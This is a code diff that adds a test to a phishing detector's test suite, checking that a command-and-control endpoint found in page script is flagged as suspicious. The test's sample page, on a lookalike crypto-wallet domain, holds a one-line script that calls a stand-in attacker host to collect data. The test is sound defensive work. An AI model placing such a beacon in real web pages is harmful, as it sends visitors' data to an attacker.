@@ -116,6 +116,13 @@ class TestPhishingDetector:
         assert not any("form submits to external" in r.lower() for r in detection.reasons)
         assert any("/api/form/submit" in ep for ep in detection.suspicious_endpoints)
 
+    def test_code_endpoints_added_to_suspicious_endpoints(self, detector):
+        """C2 endpoints found in code should be merged into suspicious endpoints."""
+        html = "<script>fetch('https://evil-server.com/api/collect')</script>"
+        result = make_browser_result(domain="kaspa-wallet.xyz", html=html)
+        detection = detector.detect(result)
+        assert any("evil-server.com" in ep for ep in detection.suspicious_endpoints)
+
     def test_suspicious_title(self, detector):
         """Suspicious page titles should add to score."""
         result = make_browser_result(title="Kaspa Wallet Recovery")
